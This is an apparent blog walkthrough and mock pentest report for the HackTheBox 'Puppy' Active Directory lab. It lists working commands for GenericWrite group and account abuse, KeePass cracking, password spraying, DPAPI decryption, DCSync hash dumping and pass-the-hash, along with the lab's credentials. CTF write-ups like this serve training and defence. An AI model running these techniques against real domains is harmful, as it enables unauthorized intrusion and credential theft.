---
title: Puppy HTB — Full Walkthrough
published: 2025-06-23
description: A detailed walkthrough of the Puppy HTB Windows Active Directory box, covering reconnaissance, initial access, privilege escalation, and domain admin takeover.
tags: [HTB, Active Directory, BloodHound, Privilege Escalation, Windows, CTF]
category: Walkthrough
draft: true
---


# Puppy HTB — Full Walkthrough

**Difficulty:** Medium

**Plataform:** HackTheBox

**Target:** Windows (Active Directory)

**Objective:** Gain Domain Admin access and capture flags

## 1. Reconnaissance

Perform a full TCP port scan:  
```bash
nmap -A 10.10.11.70 --min-rate 10000
```

**Findings:**  
- Standard AD ports: 389 (LDAP), 445 (SMB), 88 (Kerberos), etc.  
- Hostname: `puppy.htb`, `DC.puppy.htb`

Add host to `/etc/hosts`:  
```bash
echo "10.10.11.70 DC.puppy.htb puppy.htb" | sudo tee -a /etc/hosts
```

## 2. Initial Access

**Starting Credentials:**  
- **User:** levi.james  
- **Password:** KingofAkron2025!

Validate SMB access:  
```bash
crackmapexec smb 10.10.11.70 -u levi.james -p 'KingofAkron2025!'
```

**Result:** Success  

Enumerate users:  
```bash
crackmapexec smb 10.10.11.70 -u levi.james -p 'KingofAkron2025!' --users
```

Check SMB shares:  
```bash
smbmap -H 10.10.11.70 -u levi.james -p 'KingofAkron2025!'
```

**Found:** Share `DEV` (no access yet).

## 3. BloodHound Enumeration

Run BloodHound enumeration:  
```bash
bloodhound-python -dc DC.puppy.htb -u 'levi.james' -p 'KingofAkron2025!' -d PUPPY.HTB -c All -o bloodhound.json -ns 10.10.11.70
```

**Finding:** `levi.james` has `GenericWrite` permission on the `DEVELOPERS` group.

## 4. Privilege Escalation via Group Membership

Add yourself to the `DEVELOPERS` group:  
```bash
bloodyAD --host 10.10.11.70 -d puppy.htb -u levi.james -p 'KingofAkron2025!' add groupMember DEVELOPERS levi.james
```

Access the `DEV` share:  
```bash
smbclient \\10.10.11.70\DEV -U "levi.james"
```

**Files Found:**  
- `recovery.kdbx` (KeePass database)  
- KeePassXC installer  

## 5. Cracking the KeePass Database

Clone the KeePass brute force tool:  
```bash
git clone https://github.com/r3nt0n/keepass4brute.git
```

Run brute force on `.kdbx` file:  
```bash
./keepass4brute.sh recovery.kdbx /usr/share/wordlists/rockyou.txt
```

**Password Found:** `liverpool`

Export entries:  
```bash
keepassxc-cli export --format=xml recovery.kdbx > keepass_dump.xml
```

Extract credentials using a Python script. **Passwords Obtained:**  
- JamieLove2025!  
- Antman2025!

## 6. Password Spraying

Create user and password lists, then run:  
```bash
crackmapexec smb 10.10.11.70 -u users.txt -p passwords_only.txt
```

**Valid Credentials Found:**  
- **Username:** ant.edwards  
- **Password:** Antman2025!

## 7. Escalation: Write Access to adam.silver

Run BloodHound again as `ant.edwards`.  

**Finding:** `GenericWrite` on user `adam.silver`.

Check if account is disabled:  
```bash
crackmapexec smb 10.10.11.70 -u 'ADAM.SILVER' -p 'Password@987'
```

Enable and reset password:  
```bash
bloodyAD --host DC.puppy.htb -d puppy.htb -u ant.edwards -p 'Antman2025!' remove uac 'ADAM.SILVER' -f ACCOUNTDISABLE
rpcclient -U 'puppy.htb\ant.edwards%Antman2025!' 10.10.11.70 -c "setuserinfo ADAM.SILVER 23 Password@987"
```

Verify WinRM access:  
```bash
crackmapexec winrm 10.10.11.70 -u 'ADAM.SILVER' -p 'Password@987' -d puppy.htb
```

Login and grab user flag:  
```bash
evil-winrm -i 10.10.11.70 -u 'ADAM.SILVER' -p 'Password@987'
cd Desktop
type user.txt
```

## 8. Loot: Website Backup

Check `C:\Backups` and download:  
- `site-backup-2024-12-30.zip`

Extract and inspect:  
```bash
unzip site-backup-2024-12-30.zip
cat nms-auth-config.xml.bak
```

**Credentials Found:**  
- **User:** steph.cooper  
- **Password:** ChefSteph2025!

Confirm access via WinRM.

## 9. Privilege Escalation: DPAPI Dump

List DPAPI files:  
```
C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\
C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\
```

Download via SMB and decrypt using `dpapi.py` from Impacket:  
```bash
dpapi.py masterkey -file masterkey_blob -password 'ChefSteph2025!' -sid S-1-5-21-...
dpapi.py credential -f credential_blob -key <decrypted_master_key>
```

**New Credentials Obtained:**  
- **User:** steph.cooper_adm  
- **Password:** FivethChipOnItsWay2025!

## 10. Final Escalation: DCSync Attack

Dump full domain NTLM hashes:  
```bash
secretsdump.py PUPPY.HTB/steph.cooper_adm:'FivethChipOnItsWay2025!'@10.10.11.70
```

Get shell as Domain Admin:  
```bash
wmiexec.py -hashes :<NTLM_HASH> PUPPY.HTB/steph.cooper_adm@10.10.11.70
```

Capture root flag:  
```bash
cd C:\Users\Administrator\Desktop
type root.txt
```

## Lessons Learned

- Always run BloodHound early, even with low-privilege users.  
- `GenericWrite` permissions are powerful but often overlooked.  
- KeePass vaults, backups, and config files are juicy low-hanging fruit.  
- Combining BloodHound, password reuse, and misconfigurations results in a full pwn chain.  
- DPAPI and DCSync are critical Red Team concepts.  
- Privilege escalation isn’t always about exploits — often it’s about smart permission abuse.
<br><br>
# Penetration Test Report

**Client:** HTB

**Engagement:** Penetration Test - Windows Active Directory Environment

**Date:** June 2025

**Consultant:** Hugo Leonor

## 1. Objective

Evaluate the security of the Windows Active Directory environment named `puppy.htb`, identifying vulnerabilities that could enable privilege escalation and infrastructure compromise, culminating in privileged access (Domain Admin).

## 2. Scope

- **Target IP:** 10.10.11.70  
- **Services:** SMB, LDAP, Kerberos, WinRM, and other standard Active Directory services  
- **Users Provided for Initial Testing:** levi.james  

## 3. Methodology

The approach followed standard stages of an Active Directory penetration test:

- Detailed reconnaissance using Nmap  
- Enumeration of users, groups, and permissions with tools like CrackMapExec and BloodHound  
- Initial access testing with known credentials  
- Privilege escalation exploiting identified abusive permissions (GenericWrite)  
- Extraction and analysis of sensitive files (KeePass)  
- Lateral movement and capture of additional credentials  
- Use of advanced attacks (DPAPI, DCSync) to compromise privileged accounts and the domain  

## 4. Summary of Findings

| Stage | Key Result | Impact |
|-------|------------|--------|
| Initial Scan | Standard AD ports open (389, 445, 88, etc.) | Normal exposure |
| Initial Access | Credentials for levi.james valid for SMB | Starting point for enumeration |
| BloodHound Enumeration | GenericWrite permission on DEVELOPERS group | Ability to self-add to a group with higher privileges |
| DEV Share Access | Found KeePass database (recovery.kdbx) | Exposure of sensitive credentials |
| KeePass Password Crack | Password found: liverpool | Escalation to other accounts |
| Password Spraying | Valid user: ant.edwards (password Antman2025!) | Expanded initial access |
| Permission Abuse | GenericWrite on adam.silver, account enabled/reset | Local privilege escalation |
| WinRM Access | Successful login as adam.silver | User flag captured |
| Website Backup | Additional credentials found (steph.cooper) | Lateral movement |
| DPAPI | Decryption of sensitive secrets | Administrative credentials obtained |
| DCSync | Dumped domain NTLM hashes with privileged account | Full domain access (Domain Admin) |
| Root Flag Capture | Confirmed complete escalation | Total compromise |

## 5. Technical Details

### 5.1 Reconnaissance and Enumeration

A typical Windows AD environment was identified with standard ports and services. Internal DNS name resolution facilitated user and group enumeration via SMB and LDAP.

### 5.2 Initial Access and Enumeration

Provided initial credentials enabled SMB access and user listing. BloodHound execution revealed abusable GenericWrite permissions on critical groups, paving the way for escalation.

### 5.3 Privilege Escalation

GenericWrite permission was exploited to add the initial user to the DEVELOPERS group, granting access to restricted shares containing a KeePass database. Cracking the database password provided access to additional credentials, including those for higher-privileged accounts.

### 5.4 Lateral Movement and Compromise

Password spraying identified a valid user with a compromised password. Further GenericWrite permissions were exploited to reset and enable the adam.silver account, enabling WinRM access.

### 5.5 Advanced Techniques

DPAPI data extraction and decryption yielded administrative credentials. A DCSync attack allowed the complete dump of domain NTLM hashes, resulting in Domain Admin access and root flag capture.

## 6. Impact and Risks

- **Full Domain Compromise:** Domain Admin access enables complete control over the AD infrastructure.  
- **Sensitive Data Exposure:** Passwords stored in KeePass databases and backups exposed critical data.  
- **Misconfigured Permissions:** Improper use of GenericWrite permissions allowed escalation without technical vulnerabilities.  
- **Facilitated Remote Access:** Unrestricted services like WinRM increase lateral movement risks.  

## 7. Recommendations

- Review delegated permissions, especially GenericWrite on users and groups.  
- Implement monitoring and alerts for modifications to sensitive groups.  
- Ensure proper protection for credential files and backups.  
- Restrict remote services (e.g., WinRM) to authorized users with access controls.  
- Conduct periodic audits using tools like BloodHound to detect permission abuses.  
- Enforce strong password